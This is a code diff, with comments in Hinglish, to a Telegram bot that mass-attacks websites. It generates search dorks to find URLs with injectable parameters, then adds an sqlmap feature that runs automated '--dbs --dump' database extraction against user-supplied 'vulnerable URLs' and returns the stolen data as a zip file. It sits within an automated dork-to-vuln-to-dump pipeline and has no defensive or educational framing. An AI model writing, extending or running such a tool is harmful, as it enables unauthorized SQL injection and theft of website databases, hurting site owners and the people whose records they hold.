@@ -943,7 +943,32 @@ DORK_PARAMS = ["id", "cat", "page", "product", "item", "pid", "cid", "news", "ar
 DORK_TLDS = ["com", "in", "net", "org", "pk", "bd", "io", "co"]
 
 
+# ══════════════════════════════════════════════════════════════════════════════
+#  RESOURCES — phone ke shadow folder se (na mile to built-in pool)
+#  sites.txt · keywords.txt · page_types.txt · page_parameters.txt · patterns.txt
+# ══════════════════════════════════════════════════════════════════════════════
+RES_FILES = {n: os.path.join(BASE_DIR, n + ".txt") for n in
+             ("sites", "keywords", "page_types", "page_parameters", "patterns")}
+
+
+def res_lines(name, limit=20000):
+    p = RES_FILES.get(name)
+    if not p or not os.path.exists(p):
+        return []
+    try:
+        with open(p, encoding="utf-8", errors="ignore") as f:
+            out = [x.strip() for x in f if x.strip() and not x.lstrip().startswith("#")]
+        return out[:limit]
+    except Exception:
+        return []
+
+
+def res_status():
+    return {n: len(res_lines(n)) for n in RES_FILES}
+
+
 def gen_keywords(seed, count=500, langs=("en",)):
+    seed = [x.strip() for x in (seed or []) if str(x).strip()] or res_lines("keywords") or ["shop"]
     out, seen = [], set()
     for _ in range(count * 6):
         if len(out) >= count:
@@ -965,20 +990,52 @@ def gen_keywords(seed, count=500, langs=("en",)):
     return out
 
 
+def _fill_pattern(t, sites, kws, ptypes, pparams):
+    """patterns.txt ke placeholders bharo — jo na ho to chhod do."""
+    d = t
+    if "{site}" in d:
+        d = d.replace("{site}", random.choice(sites) if sites else "example.com")
+    if "{keyword}" in d:
+        d = d.replace("{keyword}", random.choice(kws) if kws else "shop")
+    if "{page_type}" in d:
+        d = d.replace("{page_type}", random.choice(ptypes) if ptypes else "product.php")
+    if "{page_parameter}" in d:
+        d = d.replace("{page_parameter}", random.choice(pparams) if pparams else "id")
+    d = d.replace("{search_function}", "").replace("{", "").replace("}", "")
+    return re.sub(r"\s+", " ", d).strip()
+
+
 def gen_dorks(count=500):
-    out, seen = set(), set()
-    for _ in range(count * 8):
+    """Pehle patterns.txt se (phone pe pada hua), phir built-in templates se."""
+    sites = res_lines("sites")
+    ptypes = res_lines("page_types")
+    pparams = res_lines("page_parameters")
+    pats = res_lines("patterns")
+    kws = [k for k in res_lines("keywords") if len(k) < 40] or \
+          ["shop", "store", "product", "login", "admin", "news"]
+    out, seen = [], set()
+
+    if pats:
+        for _ in range(count * 20 + 500):
+            if len(out) >= count:
+                break
+            d = _fill_pattern(random.choice(pats), sites, kws, ptypes, pparams)
+            if 10 < len(d) < 400 and d not in seen:
+                seen.add(d)
+                out.append(d)
+
+    for _ in range(count * 8 + 200):
         if len(out) >= count:
             break
         t = random.choice(DORK_TEMPLATES)
         d = (t.replace("{param}", random.choice(DORK_PARAMS))
               .replace("{tld}", random.choice(DORK_TLDS))
-              .replace("{kw}", random.choice(["product", "shop", "store", "admin", "news"])))
+              .replace("{kw}", random.choice(kws)))
         d = re.sub(r"\s+", " ", d).strip()
-        if d not in seen:
+        if 10 < len(d) < 400 and d not in seen:
             seen.add(d)
-            out.add(d)
-    return sorted(out)[:count]
+            out.append(d)
+    return out[:count]
 
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -1017,16 +1074,23 @@ def open_main(chat_id):
 
 
 def screen_kw(chat_id):
+    rs = res_status()
+    kb_ = rs.get("keywords", 0)
     send(chat_id, H("HQ KEYWORDS", "seed → UHQ keywords") + "\n\n"
+         + (KV("keywords.txt", f"<code>{fmt(kb_)} seeds</code>", "📂") + "\n" if kb_ else "")
          + P("Apne seed keywords bhejo — ek line me ek. Bot inhe expand karega.")
          + "\n\n<code>shoes\nwatch\nlaptop</code>", back_kb())
     wait_for(chat_id, "kw_seed")
 
 
 def screen_dork(chat_id):
+    rs = res_status()
+    src = (f"<code>patterns {rs.get('patterns', 0)} · sites {rs.get('sites', 0)} · "
+           f"kw {rs.get('keywords', 0)}</code>") if rs.get("patterns") else "<i>built-in templates</i>"
     send(chat_id, H("DORKER", "param dorks") + "\n\n"
          + KV("Templates", f"<code>{len(DORK_TEMPLATES)}</code>", "🧬") + "\n"
-         + KV("Params", f"<code>{len(DORK_PARAMS)}</code>", "🎯") + "\n\n"
+         + KV("Params", f"<code>{len(DORK_PARAMS)}</code>", "🎯") + "\n"
+         + KV("Sources", src, "📂") + "\n\n"
          + P("Kitne dorks chahiye? 100 – 50,000."),
          kb([[sbtn("500", "dork:500", "success"), sbtn("2000", "dork:2000", "success")],
              [sbtn("10000", "dork:10000", "success")], [sbtn("⬅️ BACK", "home")]]))
@@ -1064,6 +1128,7 @@ def screen_dump(chat_id):
          + KV("Rows / table", f"<code>{sget('dump_rows', 10)}</code>", "📄") + "\n\n"
          + P("Vulnerable URLs bhejo — ya LAST vuln list (inj:last se)."),
          kb([[sbtn("▶️ LAST VULN URLS", "dump:last", "success")],
+             [sbtn("🐍 SQLMAP", "sqlmap", "success")],
              [sbtn("⬅️ BACK", "home")]]))
     wait_for(chat_id, "dump_urls")
 
@@ -1255,6 +1320,104 @@ def run_dump(chat_id, uid, urls, tid):
 
 
 # ══════════════════════════════════════════════════════════════════════════════
+#  SQLMAP (optional — local Termux/VPS pe install ho to chalega)
+#  python3 -m pip install sqlmap
+# ══════════════════════════════════════════════════════════════════════════════
+def sqlmap_cmd_base():
+    """sqlmap ka command — PATH -> package -> nahi mila ([])."""
+    import shutil
+    exe = shutil.which("sqlmap")
+    if exe:
+        return [exe]
+    try:
+        import importlib
+        mod = importlib.import_module("sqlmap")
+        p = os.path.join(os.path.dirname(os.path.abspath(mod.__file__)), "sqlmap.py")
+        if os.path.exists(p):
+            return [sys.executable, p]
+    except Exception:
+        pass
+    return []
+
+
+def sqlmap_version(base):
+    try:
+        import subprocess
+        r = subprocess.run(base + ["--version"], capture_output=True, text=True, timeout=25)
+        return (r.stdout or r.stderr or "").strip().splitlines()[0][:60]
+    except Exception:
+        return "?"
+
+
+def run_sqlmap(chat_id, uid, urls, tid):
+    def work():
+        base = sqlmap_cmd_base()
+        if not base:
+            send(chat_id, H("SQLMAP", "install nahi hai") + "\n\n"
+                 + P("Termux: pip install sqlmap   |   VPS: sudo apt install sqlmap")
+                 + "\n" + P("Ya native 📥 DUMPER use karo (sqlmap ki zaroorat nahi)."),
+                 back_kb("dump"))
+            task_upd(tid, status="done")
+            return
+        import subprocess
+        targets = [u for u in urls if u.startswith("http")][:10]
+        stamp = time.strftime("%Y%m%d_%H%M%S")
+        outdir = os.path.join(DUMP_DIR, "sqlmap_" + stamp)
+        os.makedirs(outdir, exist_ok=True)
+        msg = send(chat_id, H("SQLMAP", "running") + "\n\n"
+                   + KV("Targets", f"<code>{len(targets)}</code>", "🎯") + "\n"
+                   + KV("Engine", f"<code>{esc(os.path.basename(base[0]))}</code>", "🐍"),
+                   stop_kb(tid))
+        hits = 0
+        for i, u in enumerate(targets, 1):
+            if stopped(tid):
+                break
+            if msg:
+                edit(chat_id, msg.message_id,
+                     H("SQLMAP", "live") + f"\n\n{bar(i - 1, len(targets))} {i - 1}/{len(targets)}\n\n"
+                     + f"🎯 {esc(u[:70])}\n💾 extracted: <code>{hits}</code>", stop_kb(tid))
+            cmd = base + [u, "--batch", "--non-interactive", "--dbs", "--dump",
+                          "--level", "2", "--risk", "2", "--threads", "4",
+                          "--timeout", "10", "--retries", "1", "--random-agent",
+                          "--output-dir", outdir, "--flush-session"]
+            try:
+                r = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
+                blob = ((r.stdout or "") + (r.stderr or "")).lower()
+                if "extracted" in blob or "fetched data" in blob:
+                    hits += 1
+            except subprocess.TimeoutExpired:
+                pass
+            except Exception:
+                traceback.print_exc()
+        task_upd(tid, done=len(targets), total=len(targets),
+                 status=("stopped" if stopped(tid) else "done"))
+        if msg:
+            try:
+                bot.delete_message(chat_id, msg.message_id)
+            except Exception:
+                pass
+        files = []
+        for root, _dirs, fs in os.walk(outdir):
+            for f in fs:
+                files.append(os.path.join(root, f))
+        if files:
+            import zipfile
+            zp = os.path.join(DUMP_DIR, f"sqlmap_{stamp}.zip")
+            with zipfile.ZipFile(zp, "w", zipfile.ZIP_DEFLATED) as z:
+                for f in files:
+                    z.write(f, os.path.relpath(f, outdir))
+            send_file(chat_id, zp, f"🐍 sqlmap — {len(files)} files · {hits} extracted")
+            send(chat_id, H("SQLMAP — DONE") + f"\n\n💾 Extracted: <code>{hits}</code>\n"
+                 f"📄 Files: <code>{len(files)}</code>", back_kb("dump"))
+        else:
+            send(chat_id, H("SQLMAP — 0") + "\n\n"
+                 + P("Kuch nahi nikla — URL error-based blind ho sakta hai, ya WAF block."),
+                 back_kb("dump"))
+
+    threading.Thread(target=work, daemon=True).start()
+
+
+# ══════════════════════════════════════════════════════════════════════════════
 #  PIPELINE (auto: dorks → urls → vulns → dump)
 # ══════════════════════════════════════════════════════════════════════════════
 def run_pipeline(chat_id, uid):
@@ -1367,6 +1530,16 @@ def on_cb(call):
         return
     if data == "dump":
         screen_dump(chat)
+        return
+    if data == "sqlmap":
+        base = sqlmap_cmd_base()
+        send(chat, H("SQLMAP", "external engine") + "\n\n"
+             + KV("Status", ("✅ " + esc(os.path.basename(base[0]))) if base else "❌ install nahi",
+                  "🐍") + "\n"
+             + KV("Install", "<code>pip install sqlmap</code>", "📦") + "\n\n"
+             + P("URLs bhejo (max 10). Har URL pe --dbs --dump chalega."),
+             back_kb("dump"))
+        wait_for(uid, "sqlmap_urls")
         return
     if data == "dump:last":
         vulns = (jload("users", {}).get(str(uid), {}) or {}).get("last_vulns") or []
@@ -1594,6 +1767,14 @@ def on_input(msg):
         run_dump(chat, uid, urls, task_new(uid, "dump", len(urls), "Dumper"))
         return
 
+    if key == "sqlmap_urls":
+        urls = [u for u in lines if u.startswith("http")]
+        if not urls:
+            send(chat, "❌ URLs bhejo (https://…).")
+            return
+        run_sqlmap(chat, uid, urls, task_new(uid, "sqlmap", min(10, len(urls)), "sqlmap"))
+        return
+
     if key == "qc_urls":
         urls = [u for u in lines if u.startswith("http")]
         if not urls:
@@ -1750,6 +1931,18 @@ def cmd_admin(msg):
         send(msg.chat.id, "⛔ Admin only.")
         return
     admin_screen(msg.chat.id)
+
+
+@bot.message_handler(commands=["sqlmap"])
+@safe
+def cmd_sqlmap(msg):
+    base = sqlmap_cmd_base()
+    send(msg.chat.id, H("SQLMAP", "status") + "\n\n"
+         + KV("Installed", ("✅ <code>" + esc(" ".join(base)) + "</code>") if base else "❌ nahi",
+              "🐍") + "\n"
+         + KV("Termux", "<code>pip install sqlmap</code>", "📦") + "\n\n"
+         + P("Dumper screen → 🐍 SQLMAP button, ya native 📥 DUMPER."),
+         back_kb("dump"))
 
 
 @bot.message_handler(commands=["stop"])
